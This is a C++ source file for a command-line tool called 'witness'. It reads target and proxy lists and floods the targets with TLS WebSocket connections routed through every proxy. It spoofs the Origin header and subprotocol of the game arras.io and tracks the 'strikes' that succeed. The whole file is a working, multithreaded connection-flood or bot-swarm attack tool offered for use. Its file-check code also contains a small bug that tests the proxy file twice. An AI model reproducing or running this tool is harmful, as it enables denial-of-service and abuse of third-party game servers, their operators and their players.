#include <asio/ssl.hpp>

#include "asio_tls_client.hpp"
#include "client.hpp"

#include <string>
#include <vector>
#include <fstream>

class witness {
public:
    typedef my_client<asio_tls_client> client_type;

    witness()
        : m_stats_printer(m_io_context)
    {
        m_client.set_access_channels(websocketpp::log::alevel::all);
        m_client.set_error_channels(websocketpp::log::elevel::all);

        m_client.clear_access_channels(websocketpp::log::alevel::frame_header);
        m_client.clear_access_channels(websocketpp::log::alevel::frame_payload);

        m_client.clear_access_channels(websocketpp::log::alevel::control);

        m_client.init_asio(&m_io_context);

        m_client.set_tls_init_handler([this](connection_hdl hdl) {
            auto ctx = lib::make_shared<asio::ssl::context>(asio::ssl::context::tls_client);

            ctx->set_options(asio::ssl::context::default_workarounds
                | asio::ssl::context::no_sslv2 | asio::ssl::context::no_sslv3
                | asio::ssl::context::single_dh_use);

            ctx->set_default_verify_paths();
            ctx->set_verify_mode(asio::ssl::verify_peer);

            return ctx;
        });

        m_client.set_open_handler([this](connection_hdl hdl) {
            m_connections++;

            auto connection = m_client.get_con_from_hdl(hdl);
            connection->websocket_id = m_next_ws_id++;

            connection->strike(&m_strikes);
        });

        m_client.set_close_handler([this](connection_hdl hdl) {
            m_connections--;
            auto connection = m_client.get_con_from_hdl(hdl);
            if (!connection->did_strike) {
                m_failed_strikes++;
            }
        });

        m_client.set_fail_handler([this](connection_hdl hdl) {
            m_failed_connections++;
        });
    }

    void launch_attack(std::vector<std::string>& targets, std::vector<std::string>& proxies,
        size_t num_threads, int parallel_limiter)
    {
        asio::dispatch(m_io_context, [this,
            targets = std::move(targets), proxies = std::move(proxies),
            parallel_limiter
        ]() {
            for (const std::string& target: targets) {
                launch_strikes_on_target(target, proxies);

                asio::steady_timer timer(m_io_context);

                timer.expires_after(
                    lib::chrono::milliseconds(
                        parallel_limiter));
                timer.wait();
            }
        });

        for (size_t i = 0; i < num_threads; i++) {
            m_threads.emplace_back([this]() {
                m_io_context.run();
            });
        }

        print_stats();

        for (lib::thread& t: m_threads) {
            t.join();
        }
    }

    void launch_strikes_on_target(
        std::string target, const std::vector<std::string>& proxies)
    {
        for (const std::string& proxy: proxies) {
            asio::dispatch(m_io_context, [this, proxy, target]() {
                launch_strike(target, proxy);
            });
        }
    }

    void launch_strike(const std::string& target, const std::string& proxy) {
        lib::error_code ec;
        auto connection = m_client.get_connection(target, ec);

        if (ec) {
            m_failed_connections++;
            return;
        }

        connection->replace_header("Accept-Encoding",
            "gzip, deflate, br, zstd");
        connection->replace_header("Origin", "arras.io");

        connection->add_subprotocol(
            "arras.io#v1.4+sls+et0");
        connection->add_subprotocol("arras.io");

        connection->set_proxy(proxy);

        m_client.connect(connection);
    }

    void print_stats() {
        m_stats_printer.expires_after(lib::chrono::milliseconds(1000 / 3));
        m_stats_printer.async_wait([this](asio::error_code ec) {
            if (ec) { return; }
            std::stringstream ss;
            ss << "Open handshake stats:\n"
               << "Open connections:      " << m_connections
               << '\n'
               << "Failed connections:    " << m_failed_connections
               << '\n'
               << "Successful strikes:    " << m_strikes
               << '\n'
               << "Failed strikes:        " << m_failed_strikes
               << "\n";

            m_client.get_alog().write(log::alevel::app,ss.str());
            print_stats();
        });
    }

private:
    asio::io_context m_io_context;
    client_type m_client;
    std::vector<std::thread> m_threads;

    size_t m_connections = 0;
    size_t m_failed_connections = 0;

    size_t m_strikes = 0;
    size_t m_failed_strikes = 0;

    int m_next_ws_id = 1;

    asio::steady_timer m_stats_printer;
};

int main(int argc, char* argv[]) {
    if (argc < 3) {
        std::cout << "give me a list of targets and a list of proxies please\n";
        return 0;
    }

    int parallel_limiter = 1000;
    int thread_count = 2;

    if (argc == 4) {
        thread_count = atoi(argv[3]);
        if (thread_count < 2) { thread_count = 2; }
    } else { // idk but this should parse the args fine
        int i = 3;
        while (i < argc) {
            std::string arg = argv[i];
            if (arg == "-t" && i + 1 < argc) {
                thread_count = atoi(argv[i + 1]);
                i += 2;
            } else if (
                arg == "-l" && i + 1 < argc
            ) {
                parallel_limiter
                    = atoi(argv[i + 1]);
                i += 2;
            } else {
                std::cout
                    << "use me like witness targets.list proxies.list"
                       " -t 70 -l 300\n";
                return 0;
            }
        }
    }

    std::vector<std::string> targets;
    std::vector<std::string> proxies;

    std::ifstream rt(argv[1]);
    std::ifstream rp(argv[2]);

    if (!rp.is_open() || !rp.is_open()) {
        std::cout << "one of the files isn't opening, please check\n";
        return 0;
    }

    std::string target;
    while (std::getline(rt, target)) {
        if (target.empty()) {
            continue;
        }
        targets.push_back(target);
    }

    std::string proxy;
    while (std::getline(rp, proxy)) {
        if (proxy.empty()) {
            continue;
        }
        proxies.push_back(proxy);
    }

    witness my_witness;
    my_witness.launch_attack(
        targets, proxies, thread_count, parallel_limiter
    );

    return 0;
}
